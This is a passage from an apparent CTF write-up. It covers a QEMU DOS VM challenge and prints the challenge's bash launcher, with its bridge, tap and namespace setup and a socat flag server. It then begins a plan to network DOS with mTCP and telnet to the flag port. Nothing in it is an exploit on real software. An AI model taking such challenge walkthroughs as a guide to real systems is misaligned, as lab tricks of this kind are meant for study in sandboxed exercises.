        </span><span class="nv">choice</span><span class="o">=</span><span class="si">$(</span>whiptail <span class="nt">--title</span> <span class="s2">"QEMU Floppy/System Control"</span> <span class="nt">--menu</span> <span class="s2">"Select an action:"</span> <span class="nv">$menu_height</span> <span class="nv">$menu_width</span> <span class="nv">$list_height</span> <span class="se">\</span>
            <span class="s2">"load"</span>      <span class="s2">"Load floppy disk"</span> <span class="se">\</span>
            <span class="s2">"paste"</span>     <span class="s2">"Paste clipboard contents"</span> <span class="se">\</span>
            <span class="s2">"paste-home"</span> <span class="s2">"Paste clipboard (Home after newline)"</span> <span class="se">\</span>
            <span class="s2">"eject"</span>     <span class="s2">"Eject floppy"</span> <span class="se">\</span>
            <span class="s2">"snapshot"</span>  <span class="s2">"Snapshot disk"</span> <span class="se">\</span>
            <span class="s2">"reboot"</span>    <span class="s2">"Reboot system"</span> <span class="se">\</span>
            <span class="s2">"quit"</span>      <span class="s2">"Quit"</span> <span class="se">\</span>
            3&gt;&amp;1 1&gt;&amp;2 2&gt;&amp;3<span class="si">)</span> <span class="o">||</span> <span class="nv">choice</span><span class="o">=</span><span class="s2">"quit"</span>

        <span class="k">case</span> <span class="s2">"</span><span class="nv">$choice</span><span class="s2">"</span> <span class="k">in
            </span>load<span class="p">)</span>
                <span class="c"># Build list of floppy images</span>
                <span class="nb">mapfile</span> <span class="nt">-t</span> disks &lt; &lt;<span class="o">(</span>find <span class="s2">"/challenge/disks"</span> <span class="nt">-type</span> f 2&gt;/dev/null | <span class="nb">sort</span><span class="o">)</span>

                <span class="k">if</span> <span class="o">[</span> <span class="k">${#</span><span class="nv">disks</span><span class="p">[@]</span><span class="k">}</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
                    </span>whiptail <span class="nt">--title</span> <span class="s2">"Error"</span> <span class="nt">--msgbox</span> <span class="s2">"No floppy images found in disks/"</span> <span class="k">$((</span>menu_height <span class="o">/</span> <span class="m">2</span><span class="k">))</span> <span class="k">$((</span>menu_width <span class="o">/</span> <span class="m">2</span><span class="k">))</span>
                    <span class="k">continue
                fi</span>

                <span class="c"># Build menu items for whiptail</span>
                <span class="nv">menu_items</span><span class="o">=()</span>
                <span class="k">for </span>i <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="p">!disks[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
                    </span><span class="nv">rel_path</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">disks</span><span class="p">[</span><span class="nv">$i</span><span class="p">]#/challenge/disks/</span><span class="k">}</span><span class="s2">"</span>
                    menu_items+<span class="o">=(</span><span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$rel_path</span><span class="s2">"</span><span class="o">)</span>
                <span class="k">done

                </span><span class="nv">disk_choice</span><span class="o">=</span><span class="si">$(</span>whiptail <span class="nt">--title</span> <span class="s2">"Select Floppy Disk"</span> <span class="nt">--menu</span> <span class="s2">"Available images:"</span> <span class="nv">$menu_height</span> <span class="nv">$menu_width</span> <span class="nv">$list_height</span> <span class="se">\</span>
                    <span class="s2">"</span><span class="k">${</span><span class="nv">menu_items</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span> <span class="se">\</span>
                    3&gt;&amp;1 1&gt;&amp;2 2&gt;&amp;3<span class="si">)</span> <span class="o">||</span> <span class="k">continue

                </span><span class="nv">selected</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">disks</span><span class="p">[</span><span class="nv">$disk_choice</span><span class="p">]</span><span class="k">}</span><span class="s2">"</span>
                <span class="nb">echo</span> <span class="s2">"change floppy0 </span><span class="nv">$selected</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$monitor_fifo</span><span class="s2">"</span>
                whiptail <span class="nt">--title</span> <span class="s2">"Success"</span> <span class="nt">--msgbox</span> <span class="s2">"Loaded: </span><span class="k">${</span><span class="nv">selected</span><span class="p">#/challenge/</span><span class="k">}</span><span class="s2">"</span> <span class="k">$((</span>menu_height <span class="o">/</span> <span class="m">2</span><span class="k">))</span> <span class="nv">$menu_width</span>
                <span class="p">;;</span>
            <span class="nb">paste</span><span class="p">|</span>paste-home<span class="p">)</span>
                <span class="c"># Get clipboard contents</span>
                <span class="nv">content</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span>xclip <span class="nt">-selection</span> clipboard <span class="nt">-o</span> 2&gt;/dev/null <span class="o">||</span> xsel <span class="nt">--clipboard</span> <span class="nt">--output</span> 2&gt;/dev/null <span class="o">||</span> <span class="s2">""</span><span class="si">)</span><span class="s2">"</span>

                <span class="k">if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$content</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
                    </span>whiptail <span class="nt">--title</span> <span class="s2">"Error"</span> <span class="nt">--msgbox</span> <span class="s2">"Clipboard is empty or xclip/xsel not available"</span> <span class="k">$((</span>menu_height <span class="o">/</span> <span class="m">2</span><span class="k">))</span> <span class="nv">$menu_width</span>
                    <span class="k">continue
                fi</span>

                <span class="c"># Check if content starts with "pwn"</span>
                <span class="k">if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$content</span><span class="s2">"</span> <span class="o">==</span> pwn<span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
                    </span>whiptail <span class="nt">--title</span> <span class="s2">"Error"</span> <span class="nt">--msgbox</span> <span class="s2">"Clipboard content cannot start with 'pwn'"</span> <span class="k">$((</span>menu_height <span class="o">/</span> <span class="m">2</span><span class="k">))</span> <span class="nv">$menu_width</span>
                    <span class="k">continue
                fi

                </span>whiptail <span class="nt">--title</span> <span class="s2">"Pasting"</span> <span class="nt">--infobox</span> <span class="s2">"Sending keystrokes..."</span> <span class="k">$((</span>menu_height <span class="o">/</span> <span class="m">3</span><span class="k">))</span> <span class="k">$((</span>menu_width <span class="o">/</span> <span class="m">2</span><span class="k">))</span>
                <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$choice</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"paste-home"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
                    </span>type_content <span class="s2">"</span><span class="nv">$monitor_fifo</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$content</span><span class="s2">"</span> 1
                <span class="k">else
                    </span>type_content <span class="s2">"</span><span class="nv">$monitor_fifo</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$content</span><span class="s2">"</span>
                <span class="k">fi
                </span>whiptail <span class="nt">--title</span> <span class="s2">"Success"</span> <span class="nt">--msgbox</span> <span class="s2">"Finished pasting clipboard contents"</span> <span class="k">$((</span>menu_height <span class="o">/</span> <span class="m">2</span><span class="k">))</span> <span class="nv">$menu_width</span>
                <span class="p">;;</span>
            eject<span class="p">)</span>
                <span class="nb">echo</span> <span class="s2">"eject floppy0"</span> <span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$monitor_fifo</span><span class="s2">"</span>
                whiptail <span class="nt">--title</span> <span class="s2">"Success"</span> <span class="nt">--msgbox</span> <span class="s2">"Floppy ejected"</span> <span class="k">$((</span>menu_height <span class="o">/</span> <span class="m">2</span><span class="k">))</span> <span class="k">$((</span>menu_width <span class="o">/</span> <span class="m">2</span><span class="k">))</span>
                <span class="p">;;</span>
            snapshot<span class="p">)</span>
                whiptail <span class="nt">--title</span> <span class="s2">"Snapshot"</span> <span class="nt">--infobox</span> <span class="s2">"Flushing disk and creating snapshot..."</span> <span class="k">$((</span>menu_height <span class="o">/</span> <span class="m">3</span><span class="k">))</span> <span class="nv">$menu_width</span>
                <span class="c"># Commit any pending writes to disk</span>
                <span class="nb">echo</span> <span class="s2">"commit ide0-hd0"</span> <span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$monitor_fifo</span><span class="s2">"</span>
                <span class="nb">sleep </span>1
                <span class="c"># Copy the disk image to dos-snapshot</span>
                <span class="nb">cp</span> <span class="s2">"</span><span class="nv">$DOS_IMG</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$SNAPSHOT_FILE</span><span class="s2">"</span>
                whiptail <span class="nt">--title</span> <span class="s2">"Success"</span> <span class="nt">--msgbox</span> <span class="s2">"Snapshot saved"</span> <span class="k">$((</span>menu_height <span class="o">/</span> <span class="m">2</span><span class="k">))</span> <span class="nv">$menu_width</span>
                <span class="p">;;</span>
            reboot<span class="p">)</span>
                <span class="nb">echo</span> <span class="s2">"system_reset"</span> <span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$monitor_fifo</span><span class="s2">"</span>
                whiptail <span class="nt">--title</span> <span class="s2">"Success"</span> <span class="nt">--msgbox</span> <span class="s2">"System reset sent"</span> <span class="k">$((</span>menu_height <span class="o">/</span> <span class="m">2</span><span class="k">))</span> <span class="k">$((</span>menu_width <span class="o">/</span> <span class="m">2</span><span class="k">))</span>
                <span class="p">;;</span>
            quit<span class="p">)</span>
                <span class="nb">echo</span> <span class="s2">"quit"</span> <span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$monitor_fifo</span><span class="s2">"</span>
                <span class="k">return </span>0
                <span class="p">;;</span>
        <span class="k">esac</span>
    <span class="k">done</span>
<span class="o">}</span>

cleanup<span class="o">()</span> <span class="o">{</span>
    <span class="o">[</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$FLAG_SERVER_PID</span><span class="s2">"</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">kill</span> <span class="s2">"</span><span class="nv">$FLAG_SERVER_PID</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">||</span> <span class="nb">true</span>
    <span class="o">[</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$DOS_PID</span><span class="s2">"</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">kill</span> <span class="s2">"</span><span class="nv">$DOS_PID</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">||</span> <span class="nb">true</span>
    <span class="o">[</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$CAT_PID</span><span class="s2">"</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">kill</span> <span class="s2">"</span><span class="nv">$CAT_PID</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">||</span> <span class="nb">true
    rm</span> <span class="nt">-f</span> <span class="s2">"</span><span class="k">${</span><span class="nv">MONITOR_PIPE</span><span class="k">}</span><span class="s2">.in"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">MONITOR_PIPE</span><span class="k">}</span><span class="s2">.out"</span> 2&gt;/dev/null <span class="o">||</span> <span class="nb">true
    </span>ip netns del <span class="s2">"</span><span class="nv">$FLAG_NS</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">||</span> <span class="nb">true
    </span>ip <span class="nb">link set</span> <span class="s2">"</span><span class="nv">$TAP_DOS</span><span class="s2">"</span> down 2&gt;/dev/null <span class="o">||</span> <span class="nb">true
    </span>ip <span class="nb">link </span>del <span class="s2">"</span><span class="nv">$TAP_DOS</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">||</span> <span class="nb">true
    </span>ip <span class="nb">link </span>del <span class="s2">"</span><span class="nv">$VETH_HOST</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">||</span> <span class="nb">true
    </span>ip <span class="nb">link set</span> <span class="s2">"</span><span class="nv">$BRIDGE_NAME</span><span class="s2">"</span> down 2&gt;/dev/null <span class="o">||</span> <span class="nb">true
    </span>ip <span class="nb">link </span>del <span class="s2">"</span><span class="nv">$BRIDGE_NAME</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">||</span> <span class="nb">true
    rm</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$DOS_IMG</span><span class="s2">"</span>
    <span class="nb">exit </span>0
<span class="o">}</span>

<span class="nb">umask </span>077
<span class="nb">trap </span>cleanup EXIT INT TERM

<span class="k">if</span> <span class="o">[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$SNAPSHOT_FILE</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">cp</span> <span class="s2">"</span><span class="nv">$SNAPSHOT_FILE</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$DOS_IMG</span><span class="s2">"</span>
<span class="k">else
    </span>qemu-img create <span class="nt">-f</span> raw <span class="s2">"</span><span class="nv">$DOS_IMG</span><span class="s2">"</span> 512M
    parted <span class="s2">"</span><span class="nv">$DOS_IMG</span><span class="s2">"</span> <span class="nt">--script</span> mklabel msdos mkpart primary fat32 1MiB 100% <span class="nb">set </span>1 boot on 2&gt;/dev/null
<span class="k">fi

</span>ip <span class="nb">link </span>add <span class="s2">"</span><span class="nv">$BRIDGE_NAME</span><span class="s2">"</span> <span class="nb">type </span>bridge
ip <span class="nb">link set</span> <span class="s2">"</span><span class="nv">$BRIDGE_NAME</span><span class="s2">"</span> up

<span class="c"># Create tap device for DOS VM (restricted to current user and group)</span>
ip tuntap add dev <span class="s2">"</span><span class="nv">$TAP_DOS</span><span class="s2">"</span> mode tap user <span class="s2">"</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2">"</span> group <span class="s2">"</span><span class="si">$(</span><span class="nb">id</span> <span class="nt">-gn</span><span class="si">)</span><span class="s2">"</span>
ip <span class="nb">link set</span> <span class="s2">"</span><span class="nv">$TAP_DOS</span><span class="s2">"</span> master <span class="s2">"</span><span class="nv">$BRIDGE_NAME</span><span class="s2">"</span>
ip <span class="nb">link set</span> <span class="s2">"</span><span class="nv">$TAP_DOS</span><span class="s2">"</span> up

ip netns add <span class="s2">"</span><span class="nv">$FLAG_NS</span><span class="s2">"</span>
ip <span class="nb">link </span>add <span class="s2">"</span><span class="nv">$VETH_HOST</span><span class="s2">"</span> <span class="nb">type </span>veth peer name <span class="s2">"</span><span class="nv">$VETH_NS</span><span class="s2">"</span>
ip <span class="nb">link set</span> <span class="s2">"</span><span class="nv">$VETH_HOST</span><span class="s2">"</span> master <span class="s2">"</span><span class="nv">$BRIDGE_NAME</span><span class="s2">"</span>
ip <span class="nb">link set</span> <span class="s2">"</span><span class="nv">$VETH_HOST</span><span class="s2">"</span> up
ip <span class="nb">link set</span> <span class="s2">"</span><span class="nv">$VETH_NS</span><span class="s2">"</span> netns <span class="s2">"</span><span class="nv">$FLAG_NS</span><span class="s2">"</span>
ip netns <span class="nb">exec</span> <span class="s2">"</span><span class="nv">$FLAG_NS</span><span class="s2">"</span> ip <span class="nb">link set </span>lo up
ip netns <span class="nb">exec</span> <span class="s2">"</span><span class="nv">$FLAG_NS</span><span class="s2">"</span> ip <span class="nb">link set</span> <span class="s2">"</span><span class="nv">$VETH_NS</span><span class="s2">"</span> up
ip netns <span class="nb">exec</span> <span class="s2">"</span><span class="nv">$FLAG_NS</span><span class="s2">"</span> ip addr add <span class="s2">"</span><span class="k">${</span><span class="nv">FLAG_SERVER_IP</span><span class="k">}</span><span class="s2">/24"</span> dev <span class="s2">"</span><span class="nv">$VETH_NS</span><span class="s2">"</span>

ip netns <span class="nb">exec</span> <span class="s2">"</span><span class="nv">$FLAG_NS</span><span class="s2">"</span> socat <span class="s2">"TCP-LISTEN:</span><span class="k">${</span><span class="nv">FLAG_SERVER_PORT</span><span class="k">}</span><span class="s2">,bind=</span><span class="k">${</span><span class="nv">FLAG_SERVER_IP</span><span class="k">}</span><span class="s2">,reuseaddr,fork"</span> SYSTEM:<span class="s2">"cat /flag"</span> &amp;
<span class="nv">FLAG_SERVER_PID</span><span class="o">=</span><span class="nv">$!</span>

<span class="nb">mkfifo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">MONITOR_PIPE</span><span class="k">}</span><span class="s2">.in"</span>
<span class="nb">mkfifo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">MONITOR_PIPE</span><span class="k">}</span><span class="s2">.out"</span>

qemu-system-x86_64 <span class="se">\</span>
    <span class="nt">-name</span> dos <span class="se">\</span>
    <span class="nt">-m</span> 16M <span class="se">\</span>
    <span class="nt">-smp</span> 1 <span class="se">\</span>
    <span class="nt">-drive</span> <span class="nv">file</span><span class="o">=</span><span class="s2">"</span><span class="nv">$DOS_IMG</span><span class="s2">"</span>,format<span class="o">=</span>raw,if<span class="o">=</span>ide <span class="se">\</span>
    <span class="nt">-boot</span> d <span class="se">\</span>
    <span class="nt">-netdev</span> tap,id<span class="o">=</span>net0,ifname<span class="o">=</span><span class="s2">"</span><span class="nv">$TAP_DOS</span><span class="s2">"</span>,script<span class="o">=</span>no,downscript<span class="o">=</span>no <span class="se">\</span>
    <span class="nt">-device</span> pcnet,netdev<span class="o">=</span>net0,mac<span class="o">=</span>52:54:00:12:34:56 <span class="se">\</span>
    <span class="nt">-monitor</span> pipe:<span class="s2">"</span><span class="nv">$MONITOR_PIPE</span><span class="s2">"</span> <span class="se">\</span>
    <span class="nt">-parallel</span> none <span class="se">\</span>
    <span class="nt">-vga</span> cirrus <span class="se">\</span>
    <span class="o">&gt;</span>&amp;/dev/null &amp;

<span class="nv">DOS_PID</span><span class="o">=</span><span class="nv">$!</span>

<span class="c"># Open the output pipe to prevent blocking, discard output</span>
<span class="nb">cat</span> <span class="s2">"</span><span class="k">${</span><span class="nv">MONITOR_PIPE</span><span class="k">}</span><span class="s2">.out"</span> <span class="o">&gt;</span> /dev/null &amp;
<span class="nv">CAT_PID</span><span class="o">=</span><span class="nv">$!</span>

<span class="c"># Wait a moment for QEMU to open the pipes</span>
<span class="nb">sleep </span>1

monitor_menu <span class="s2">"</span><span class="k">${</span><span class="nv">MONITOR_PIPE</span><span class="k">}</span><span class="s2">.in"</span>
<span class="nb">wait</span> <span class="nv">$DOS_PID</span> 2&gt;/dev/null <span class="o">||</span> <span class="nb">true</span>
</pre></table></code></div></div></details><p>Overall, the challenge is a QEMU DOS VM controlled via TUI menu so we must use desktop interface to interact with it.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>ip <span class="nb">link </span>add <span class="s2">"</span><span class="nv">$BRIDGE_NAME</span><span class="s2">"</span> <span class="nb">type </span>bridge
ip <span class="nb">link set</span> <span class="s2">"</span><span class="nv">$BRIDGE_NAME</span><span class="s2">"</span> up

<span class="c"># tap device for DOS VM</span>
ip tuntap add dev <span class="s2">"</span><span class="nv">$TAP_DOS</span><span class="s2">"</span> mode tap user <span class="s2">"</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2">"</span> group <span class="s2">"</span><span class="si">$(</span><span class="nb">id</span> <span class="nt">-gn</span><span class="si">)</span><span class="s2">"</span>
ip <span class="nb">link set</span> <span class="s2">"</span><span class="nv">$TAP_DOS</span><span class="s2">"</span> master <span class="s2">"</span><span class="nv">$BRIDGE_NAME</span><span class="s2">"</span>
ip <span class="nb">link set</span> <span class="s2">"</span><span class="nv">$TAP_DOS</span><span class="s2">"</span> up

ip netns add <span class="s2">"</span><span class="nv">$FLAG_NS</span><span class="s2">"</span>
ip <span class="nb">link </span>add <span class="s2">"</span><span class="nv">$VETH_HOST</span><span class="s2">"</span> <span class="nb">type </span>veth peer name <span class="s2">"</span><span class="nv">$VETH_NS</span><span class="s2">"</span>
ip <span class="nb">link set</span> <span class="s2">"</span><span class="nv">$VETH_HOST</span><span class="s2">"</span> master <span class="s2">"</span><span class="nv">$BRIDGE_NAME</span><span class="s2">"</span>
ip <span class="nb">link set</span> <span class="s2">"</span><span class="nv">$VETH_HOST</span><span class="s2">"</span> up
ip <span class="nb">link set</span> <span class="s2">"</span><span class="nv">$VETH_NS</span><span class="s2">"</span> netns <span class="s2">"</span><span class="nv">$FLAG_NS</span><span class="s2">"</span>
ip netns <span class="nb">exec</span> <span class="s2">"</span><span class="nv">$FLAG_NS</span><span class="s2">"</span> ip <span class="nb">link set </span>lo up
ip netns <span class="nb">exec</span> <span class="s2">"</span><span class="nv">$FLAG_NS</span><span class="s2">"</span> ip <span class="nb">link set</span> <span class="s2">"</span><span class="nv">$VETH_NS</span><span class="s2">"</span> up
ip netns <span class="nb">exec</span> <span class="s2">"</span><span class="nv">$FLAG_NS</span><span class="s2">"</span> ip addr add <span class="s2">"</span><span class="k">${</span><span class="nv">FLAG_SERVER_IP</span><span class="k">}</span><span class="s2">/24"</span> dev <span class="s2">"</span><span class="nv">$VETH_NS</span><span class="s2">"</span>

ip netns <span class="nb">exec</span> <span class="s2">"</span><span class="nv">$FLAG_NS</span><span class="s2">"</span> socat <span class="se">\</span>
    <span class="s2">"TCP-LISTEN:</span><span class="k">${</span><span class="nv">FLAG_SERVER_PORT</span><span class="k">}</span><span class="s2">,bind=</span><span class="k">${</span><span class="nv">FLAG_SERVER_IP</span><span class="k">}</span><span class="s2">,reuseaddr,fork"</span> <span class="se">\</span>
    SYSTEM:<span class="s2">"cat /flag"</span> &amp;
</pre></table></code></div></div><p>This part creates a bridge <code class="language-plaintext highlighter-rouge">br-qemu$$</code>, connect a tap device <code class="language-plaintext highlighter-rouge">tap-dos$$</code> for the DOS VM to the device and creates a veth pair <code class="language-plaintext highlighter-rouge">vfh$$‚Äìvfn$$</code></p><ul><li><code class="language-plaintext highlighter-rouge">vfh$$</code> is also connected to the bridge.<li><code class="language-plaintext highlighter-rouge">vfn$$</code> is placed in a separate network namespace <code class="language-plaintext highlighter-rouge">nsflag$$</code> namespace with IP <code class="language-plaintext highlighter-rouge">192.168.13.37/24</code>.</ul><p>After searching on the internet, I found that:</p><ul><li><code class="language-plaintext highlighter-rouge">Bridge</code> is a virtual Layer-2 switch that connect multiple interfaces together so they share the same broadcast domain. Layer-2 swith (Switch Layer 2) forwards Ethernet frames between its ports based on MAC addresses, so all attached interfaces share the same LAN.<li><code class="language-plaintext highlighter-rouge">Tap</code> act like a cable that connect the VM to the bridge.<li><code class="language-plaintext highlighter-rouge">Veth pair</code> (Virtual Ethernet pair) is a pair of interfaces joined back-to-back: any packet sent into one end comes out the other, which is perfect for connecting a network namespace to the host or to a bridge.</ul><p>Inside <code class="language-plaintext highlighter-rouge">nsflag$$</code>, it runs</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>socat <span class="s2">"TCP-LISTEN:1337,bind=192.168.13.37,reuseaddr,fork"</span> SYSTEM:<span class="s2">"cat /flag"</span>
</pre></table></code></div></div><p>So the network look like this:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>          (host namespace)
        +------------------+
        |                  |
        |   br-qemu$$      |
        |    /      \      |
        | tap-dos$$  vfh$$ |
        +----|--------|----+
             |        |
             |        |
       [ DOS VM ]  (veth)
                       \
                        \       (netns: nsflag$$)
                         +-----------------------------+
                         | vfn$$ @ 192.168.13.37/24    |
                         |                             |
                         | socat TCP:1337 -&gt; cat /flag |
                         +-----------------------------+
</pre></table></code></div></div><p>So the idea is to make DOS network working and connect to <code class="language-plaintext highlighter-rouge">192.168.13.37:1337</code> inside DOS to get the flag</p><hr /><h3 id="exploitation-10"><span class="me-2">Exploitation</span><a href="#exploitation-10" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Menu TUI</p><p><a href="/assets/img/AdventOfPwn2025/pic10.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic10.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>load       Load floppy disk
paste      Paste clipboard contents
paste-home Paste clipboard (Home after newline)
eject      Eject floppy
snapshot   Snapshot disk
reboot     Reboot system
quit       Quit
</pre></table></code></div></div><p>We have several floppy images in <code class="language-plaintext highlighter-rouge">/challenge/disks</code>:</p><ul><li><code class="language-plaintext highlighter-rouge">dos</code> ‚Äì DOS tools / installer.<li><code class="language-plaintext highlighter-rouge">lanman</code> - LAN manager network client.<li><code class="language-plaintext highlighter-rouge">mtcp</code> - <a href="https://www.brutman.com/mTCP/">mTCP</a><li><code class="language-plaintext highlighter-rouge">pcnet</code> - PCnet packet driver for DOS.<li><code class="language-plaintext highlighter-rouge">turbocpp</code> - Turbo C++.</ul><p>So the plan is:</p><ul><li>Boot into <code class="language-plaintext highlighter-rouge">DOS</code>.<li>Load <code class="language-plaintext highlighter-rouge">pcnet</code> packet driver from <code class="language-plaintext highlighter-rouge">pcnet</code>.<li>Load and copy <code class="language-plaintext highlighter-rouge">mtcp</code> tools to <code class="language-plaintext highlighter-rouge">C:</code> and configure <code class="language-plaintext highlighter-rouge">MTCPCFG</code>.<li>Use mTCP‚Äôs <code class="language-plaintext highlighter-rouge">TELNET.EXE</code> to connect to <code class="language-plaintext highlighter-rouge">192.168.13.37:1337</code>.</ul><p>My setup is based on <a href="https://www.scribd.com/document/512968966/mTCP-2020-03-07">this</a></p><h4 id="boot-into-dos"><span class="me-2">Boot into <code class="language-plaintext highlighter-rouge">DOS</code></span><a href="#boot-into-dos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>There‚Äôre 3 disk in <code class="language-plaintext highlighter-rouge">DOS</code> need to be boot. I first load <code class="language-plaintext highlighter-rouge">disk1.img</code> and then reboot system, then setup.</p><p><a href="/assets/img/AdventOfPwn2025/pic11.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic11.png" alt="Desktop View" width="375" height="150" loading="lazy"></a> <a href="/assets/img/AdventOfPwn2025/pic12.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic12.png" alt="Desktop View" width="375" height="150" loading="lazy"></a></p><p><a href="/assets/img/AdventOfPwn2025/pic13.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic13.png" alt="Desktop View" width="375" height="150" loading="lazy"></a> <a href="/assets/img/AdventOfPwn2025/pic14.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic14.png" alt="Desktop View" width="375" height="150" loading="lazy"></a></p><p><a href="/assets/img/AdventOfPwn2025/pic15.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic15.png" alt="Desktop View" width="375" height="150" loading="lazy"></a> <a href="/assets/img/AdventOfPwn2025/pic16.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic16.png" alt="Desktop View" width="375" height="150" loading="lazy"></a></p><p><code class="language-plaintext highlighter-rouge">load</code> more <code class="language-plaintext highlighter-rouge">disk2.img</code> and <code class="language-plaintext highlighter-rouge">disk3.img</code></p><p><a href="/assets/img/AdventOfPwn2025/pic17.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic17.png" alt="Desktop View" width="375" height="150" loading="lazy"></a> <a href="/assets/img/AdventOfPwn2025/pic18.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic18.png" alt="Desktop View" width="375" height="150" loading="lazy"></a></p><p>Then <code class="language-plaintext highlighter-rouge">eject</code> (remove) the floppy.</p><p><a href="/assets/img/AdventOfPwn2025/pic19.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic19.png" alt="Desktop View" width="375" height="150" loading="lazy"></a> <a href="/assets/img/AdventOfPwn2025/pic20.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic20.png" alt="Desktop View" width="375" height="150" loading="lazy"></a></p><p>After completed, we have <code class="language-plaintext highlighter-rouge">DOS</code> prompt:</p><p><a href="/assets/img/AdventOfPwn2025/pic21.png" class="popup img-link normal shimmer"><img src="/assets/img/AdventOfPwn2025/pic21.png" alt="Desktop View" width="700" height="300" loading="lazy"></a></p><h4 id="load-pcnet-packet-driver"><span class="me-2">Load <code class="language-plaintext highlighter-rouge">pcnet</code> packet driver</span><a href="#load-pcnet-packet-driver" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Load <code class="language-plaintext highlighter-rouge">pcnet/disk1.vfd</code> into DOS. After loaded, all files are in <code class="language-plaintext highlighter-rouge">A:</code> drive.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>A:
DIR
